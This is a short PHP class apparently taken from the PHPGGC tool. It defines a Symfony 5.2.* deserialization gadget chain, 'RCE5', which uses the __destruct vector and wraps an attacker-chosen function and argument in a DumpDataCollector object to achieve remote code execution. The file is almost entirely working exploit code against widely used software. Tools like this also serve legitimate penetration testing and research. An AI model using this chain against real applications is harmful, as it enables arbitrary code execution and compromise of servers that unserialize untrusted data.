<?php

namespace GadgetChain\Symfony;

class RCE5 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.2.*';
    public static $vector = '__destruct';
    public static $author = 'byc_404';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];


        return new \Symfony\Component\HttpKernel\DataCollector\DumpDataCollector($function, $parameter);
    }
}